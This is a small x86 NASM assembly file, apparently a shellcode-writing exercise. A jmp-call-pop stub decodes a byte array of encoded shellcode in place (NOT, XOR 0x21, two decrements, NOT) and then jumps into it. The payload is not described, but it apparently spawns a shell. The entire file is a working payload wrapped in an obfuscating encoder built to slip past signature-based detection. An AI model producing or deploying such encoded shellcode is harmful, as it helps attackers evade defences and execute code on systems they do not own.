global _start			

section .text
_start:

	jmp short call_decoder

decoder:
	pop esi


decode:
	cmp byte [esi], 0x21
	jz Shellcode

	;in reverse of encoding NOT > XOR > decrementx2 > NOT
	not byte [esi]

	xor byte [esi],0x21

	dec byte [esi]
	dec byte [esi]

	not byte [esi]

	inc esi
	jmp short decode


call_decoder:

	call decoder
	Shellcode: db 0x0e,0x9f,0x6f,0x47,0x0c,0x0c,0x50,0x47,0x47,0x0c,0x41,0x46,0x4d,0xa6,0xc0,0x6f,0xa6,0xc1,0x70,0xa6,0xfe,0x8f,0x28,0xea,0x5f,0x21
